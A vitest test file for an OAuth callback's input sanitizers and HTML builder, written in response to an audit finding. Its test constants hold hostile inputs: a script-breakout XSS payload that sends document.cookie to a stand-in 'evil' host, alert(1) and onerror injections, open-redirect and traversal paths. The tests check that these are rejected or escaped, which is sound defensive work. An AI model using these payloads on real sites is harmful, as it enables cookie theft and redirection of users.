import { describe, expect, it } from "vitest";

import {
  AUTH_FLOWS,
  DEFAULT_NEXT,
  buildHashForwardHtml,
  escapeHtmlAttribute,
  sanitizeAuthFlow,
  sanitizeErrorCode,
  sanitizeErrorDescription,
  sanitizeNextPath,
} from "./oauthCallback";

// The payload from the security audit (docs/audit-2026-07-27.md, 3.0). The
// old route validated `next` as "starts with /, not //", which this passes,
// then interpolated it into a <script> body via JSON.stringify -- which does
// not escape `</script>`, so it broke out of the script element and ran.
const XSS_NEXT = "/a</script><script>fetch('//evil/'+document.cookie)</script>";
const XSS_ERROR_CODE = "</script><script>alert(1)</script>";

// The rejection cases assert DEFAULT_NEXT rather than a literal, because what
// they are about is "a hostile value becomes the default", not which route the
// default happens to be -- Pass 5 moved it from /daily to / and the two are
// different questions. `/infinite` carries the passthrough half: since the
// default is now `/`, `sanitizeNextPath("/") === "/"` no longer distinguishes a
// value that survived from one that was replaced.
describe("sanitizeNextPath", () => {
  it("passes through the real routes the app actually sends", () => {
    for (const path of ["/", "/infinite", "/online", "/how-to-play", "/privacy-policy"]) {
      expect(sanitizeNextPath(path)).toBe(path);
    }
  });

  it("rejects the script-breakout payload", () => {
    expect(sanitizeNextPath(XSS_NEXT)).toBe(DEFAULT_NEXT);
  });

  it("rejects protocol-relative open redirects, including the backslash form", () => {
    // `/\evil.com` passes a startsWith("//") check but the WHATWG URL parser
    // treats `\` as `/` for special schemes, so location.replace() navigates
    // off-site. This is the bug a `//`-only check misses.
    expect(sanitizeNextPath("/\\evil.com")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("//evil.com")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/\\/evil.com")).toBe(DEFAULT_NEXT);
  });

  it("rejects absolute URLs, traversal, embedded query/fragment and control characters", () => {
    expect(sanitizeNextPath("https://evil.com")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/infinite/../../etc")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/infinite?next=/x")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/infinite#frag")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/infinite\n/x")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("/infin ite")).toBe(DEFAULT_NEXT);
  });

  it("falls back for missing or oversized input", () => {
    expect(sanitizeNextPath(null)).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath(undefined)).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath("")).toBe(DEFAULT_NEXT);
    expect(sanitizeNextPath(`/${"a".repeat(600)}`)).toBe(DEFAULT_NEXT);
  });
});

describe("sanitizeErrorCode", () => {
  it("passes through real GoTrue codes", () => {
    expect(sanitizeErrorCode("identity_already_exists")).toBe("identity_already_exists");
    expect(sanitizeErrorCode("validation_failed")).toBe("validation_failed");
  });

  it("rejects markup and anything outside the identifier charset", () => {
    expect(sanitizeErrorCode(XSS_ERROR_CODE)).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode('" onerror="alert(1)')).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode("a".repeat(65))).toBe("oauth_callback_failed");
    expect(sanitizeErrorCode(null)).toBe("oauth_callback_failed");
  });
});

describe("escapeHtmlAttribute", () => {
  it("escapes every character that could close an attribute or a tag", () => {
    expect(escapeHtmlAttribute(`<>&"'`)).toBe("&lt;&gt;&amp;&quot;&#39;");
  });

  it("escapes the ampersand first so entities are not double-broken", () => {
    expect(escapeHtmlAttribute("&lt;")).toBe("&amp;lt;");
  });
});

describe("buildHashForwardHtml", () => {
  const nonce = "test-nonce";

  it("emits exactly one script element terminator", () => {
    // The whole class of bug: any extra `</script` in the output means a
    // value escaped its element. Holds for hostile input because sanitizing
    // runs first, and for raw input because of attribute escaping.
    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });
    expect(html.match(/<\/script/gi)).toHaveLength(1);
  });

  it("keeps injected markup inert even if it reaches the builder unsanitized", () => {
    const html = buildHashForwardHtml({ next: XSS_NEXT, errorCode: XSS_ERROR_CODE, nonce });

    // The payload's characters survive as escaped attribute *text* -- what
    // must not survive is any of it parsing as markup. One script element
    // in, one script element out.
    expect(html.match(/<script/gi)).toHaveLength(1);
    expect(html.match(/<\/script/gi)).toHaveLength(1);
    expect(html).toContain("&lt;/script&gt;");
    // No unescaped delimiter left to close the attribute or the tag.
    expect(html).not.toContain("<script>alert(1)");
    expect(html).not.toContain("fetch('");
  });

  it("carries the sanitized values as data attributes, not as script source", () => {
    const html = buildHashForwardHtml({ next: "/online", errorCode: "identity_already_exists", nonce });

    expect(html).toContain('data-next="/online"');
    expect(html).toContain('data-fallback-code="identity_already_exists"');
    expect(html).toContain(`nonce="${nonce}"`);
    // The script reads its inputs at runtime; neither value appears inside
    // the script body itself.
    const scriptBody = html.slice(html.indexOf(">", html.indexOf("<script")), html.indexOf("</script"));
    expect(scriptBody).not.toContain("/online");
    expect(scriptBody).not.toContain("identity_already_exists");
  });

  it("forwards the hash-only `error` key as well as `error_code`", () => {
    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });
    expect(html).toContain('hashParams.get("error_code") || hashParams.get("error")');
  });

  it("forwards error_description, encoded, without interpolating it", () => {
    // The description is the only thing that tells a rate limit apart from a
    // missing redirect URL -- both arrive as a bare `server_error` code. It is
    // read from the hash at RUNTIME and encoded, so it never passes through the
    // builder as a value and has no interpolation site to escape from.
    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });

    expect(html).toContain('hashParams.get("error_description")');
    expect(html).toContain("encodeURIComponent(description");
    // Still exactly one script element, which is the invariant this whole file
    // exists to protect.
    expect(html.match(/<\/script/gi)).toHaveLength(1);
  });
});

describe("sanitizeErrorDescription", () => {
  it("keeps a real GoTrue description readable", () => {
    expect(sanitizeErrorDescription("Email rate limit exceeded")).toBe("Email rate limit exceeded");
  });

  it("collapses the whitespace GoTrue sends, including newlines", () => {
    // These arrive `+`-encoded and sometimes multi-line; a description spread
    // over three log lines is one nobody reads.
    expect(sanitizeErrorDescription("  Unable to  exchange\r\nexternal   code  ")).toBe(
      "Unable to exchange external code",
    );
  });

  it("is absent rather than empty when there is nothing to say", () => {
    // The caller omits the param entirely on null, so an empty-string
    // description must not become `&error_description=`.
    expect(sanitizeErrorDescription(null)).toBeNull();
    expect(sanitizeErrorDescription("")).toBeNull();
    expect(sanitizeErrorDescription("   \n  ")).toBeNull();
  });

  it("caps the length, so a hostile hash can't make an unusable URL", () => {
    expect(sanitizeErrorDescription("x".repeat(500))).toHaveLength(200);
  });
});

describe("sanitizeAuthFlow", () => {
  it("passes through every flow the app actually sends", () => {
    for (const flow of AUTH_FLOWS) {
      expect(sanitizeAuthFlow(flow)).toBe(flow);
    }
  });

  it("falls back to google for anything unrecognised", () => {
    // Google is the default because it is the only flow that existed before
    // this param did: a callback with no `flow` at all -- the hash-forward
    // branch, or a link built before this change -- is a Google round trip.
    expect(sanitizeAuthFlow(null)).toBe("google");
    expect(sanitizeAuthFlow(undefined)).toBe("google");
    expect(sanitizeAuthFlow("")).toBe("google");
    expect(sanitizeAuthFlow("EMAIL")).toBe("google");
    expect(sanitizeAuthFlow("<script>alert(1)</script>")).toBe("google");
  });

  it("returns a value safe to interpolate into a redirect URL unescaped", () => {
    // The route builds `${next}?auth=${flow}` with no encodeURIComponent, on
    // the strength of this allowlist. Pin the property rather than the call
    // site, so adding a flow with a `&` or a space in it fails here.
    for (const flow of AUTH_FLOWS) {
      expect(encodeURIComponent(flow)).toBe(flow);
    }
  });
});
